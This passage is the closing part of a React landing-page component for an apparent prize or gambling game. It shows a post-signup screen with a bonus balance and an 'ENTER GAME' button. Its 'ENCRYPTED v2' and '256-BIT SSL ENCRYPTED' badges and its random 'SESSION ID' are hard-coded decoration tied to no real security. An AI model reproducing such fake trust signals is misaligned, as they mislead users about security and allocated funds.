                                            const dist = 50 + Math.random() * 20;
                                            const tx = Math.cos(angle * Math.PI / 180) * dist;
                                            const ty = Math.sin(angle * Math.PI / 180) * dist;
                                            const colorClass = authMode === 'signup' ? 'bg-green-400' : 'bg-yellow-400';
                                            return (
                                                <div
                                                    key={i}
                                                    className={`absolute top-1/2 left-1/2 w-1.5 h-1.5 rounded-full ${colorClass}`}
                                                    style={{
                                                        '--tx': `${tx}px`,
                                                        '--ty': `${ty}px`,
                                                        animation: `particle-burst 0.6s ease-out forwards`
                                                    } as React.CSSProperties}
                                                />
                                            );
                                        })}
                                    </div>
                                )}

                                {authMode === 'signup' ? (
                                    <Check className="w-8 h-8 animate-pulse text-green-500 relative z-10" />
                                ) : (
                                    <Target className="w-8 h-8 animate-pulse text-yellow-500 relative z-10" />
                                )}
                            </div>
                            
                            {/* Conditional Header based on Auth Mode */}
                            {authMode === 'signup' ? (
                                <>
                                    <h2 className="text-2xl font-black text-white italic">ACCOUNT SECURED</h2>
                                    <div className="inline-flex items-center gap-1 bg-green-500/20 px-2 py-0.5 rounded text-[10px] text-green-300 font-bold mt-2 border border-green-500/30">
                                        <Check className="w-3 h-3" /> REGISTERED
                                    </div>
                                </>
                            ) : (
                                <>
                                    <h2 className="text-2xl font-black text-white italic">BONUS LOCKED</h2>
                                    <p className="text-gray-400 text-xs mt-1">Funds allocated. Step in and win.</p>
                                </>
                            )}
                        </div>

                        {/* Summary Card with Distinct Styles */}
                        <div className={`bg-black/40 border border-dashed rounded-xl p-4 mb-6 relative overflow-hidden ${authMode === 'signup' ? 'border-green-700' : 'border-yellow-700'}`}>
                            <div className={`absolute top-0 left-0 w-1 h-full shadow-[0_0_10px_currentColor] ${authMode === 'signup' ? 'bg-green-500 text-green-500' : 'bg-yellow-500 text-yellow-500'}`}></div>
                            <div className="flex justify-between items-center mb-2">
                                <span className="text-xs text-gray-500 uppercase font-bold">Account</span>
                                <span className="text-sm text-white font-mono font-bold">{username.toUpperCase()}</span>
                            </div>
                            <div className="flex justify-between items-center">
                                <span className="text-xs text-gray-500 uppercase font-bold">Ready Balance</span>
                                <div className={`flex items-center gap-1.5 font-bold text-lg ${authMode === 'signup' ? 'text-green-400' : 'text-yellow-400'}`}>
                                    <Coins className="w-4 h-4" />
                                    <span>{formatPrize(allocatedPrize)}</span>
                                </div>
                            </div>
                            {/* "Secure Gateway" Feature - Replaces Cabinet */}
                             <div className="mt-3 pt-3 border-t border-white/5 flex items-center justify-between">
                                <span className="text-[10px] text-gray-500 uppercase font-bold">Secure Gateway</span>
                                <span className="text-[10px] text-emerald-400 font-bold bg-emerald-900/20 px-2 py-0.5 rounded border border-emerald-500/30 flex items-center gap-1">
                                    <Wifi className="w-3 h-3" /> ENCRYPTED v2
                                </span>
                            </div>
                        </div>

                        {/* Manual Trigger Button - Distinct Styles */}
                        <button 
                            onClick={handleAttemptEnter}
                            disabled={stage === 'verifying'}
                            className={`w-full py-4 rounded-xl font-black text-sm uppercase tracking-widest shadow-lg flex items-center justify-center gap-2 transition-all active:scale-95 disabled:opacity-70 group
                                ${authMode === 'signup' 
                                    ? 'bg-gradient-to-r from-green-600 to-emerald-600 hover:from-green-500 hover:to-emerald-500 text-white shadow-green-900/20' 
                                    : 'bg-gradient-to-r from-yellow-600 to-amber-600 hover:from-yellow-500 hover:to-amber-500 text-white shadow-yellow-900/20'
                                }`}
                        >
                            {stage === 'verifying' ? (
                                <>
                                    <Loader2 className="w-4 h-4 animate-spin" /> Finalizing...
                                </>
                            ) : (
                                <>
                                    <Play className="w-4 h-4 group-hover:scale-110 transition fill-current" /> ENTER GAME
                                </>
                            )}
                        </button>
                        
                        <div className="text-center mt-3">
                            <p className="text-[10px] text-gray-600 flex items-center justify-center gap-1">
                                <Lock className="w-3 h-3" /> 256-BIT SSL ENCRYPTED
                            </p>
                        </div>
                    </div>
                )}
            </div>

            {/* Footer */}
            <div className="mt-8 text-center opacity-40 hover:opacity-100 transition-opacity">
                 <p className="text-[10px] text-white font-mono">
                    SESSION ID: {Math.random().toString(36).substr(2, 8).toUpperCase()} • NODE: {REGION_CONFIG[region].name}
                 </p>
            </div>
        </div>

    </div>
  );
};

export default LandingPage;